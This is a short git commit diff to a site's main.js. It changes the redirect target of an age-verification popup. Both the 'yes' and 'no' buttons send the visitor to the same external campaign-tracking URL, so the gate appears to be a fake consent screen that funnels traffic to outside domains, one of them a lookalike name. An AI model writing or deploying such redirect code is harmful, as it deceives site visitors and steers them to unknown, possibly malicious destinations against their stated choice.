3351e54db600ad0ca496f07e2f27e5f002b92ac9
digitalscop <frshbat69@gmail.com>
2026-02-13 11:08:12 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -81,10 +81,10 @@ if(form){
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://ferreroo.site/?utm_campaign=wVoRtbQe2Z&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://t7q4.com/?utm_campaign=wVoRtbQe2Z&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://ferreroo.site/?utm_campaign=wVoRtbQe2Z&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://t7q4.com/?utm_campaign=wVoRtbQe2Z&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
 
